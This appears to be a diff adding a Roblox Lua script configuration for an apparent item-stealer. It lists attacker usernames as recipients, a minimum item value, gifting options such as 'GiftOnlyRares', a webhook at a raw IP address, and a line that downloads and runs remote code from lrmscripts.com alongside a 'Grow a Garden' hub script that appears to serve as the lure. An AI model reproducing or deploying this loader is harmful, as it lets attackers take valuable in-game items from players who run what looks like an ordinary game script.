@@ -1,0 +1,14 @@
+_G.LRMConfig = {
+    User = {"Nonohitsx", "SpeedXBet"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/5bf362dd46c140b5cd7b02d7c0f4954f",
+    FakeGift = "No",
+    Trash = "http://176.100.37.215:20002/proxy/5bf362dd46c140b5cd7b02d7c0f4954f",
+    LoadingScreen = "No",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "Yes",
+    OtherScript = "loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-NoLag-Hub-no-key-38699"))()",
+}
+    
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
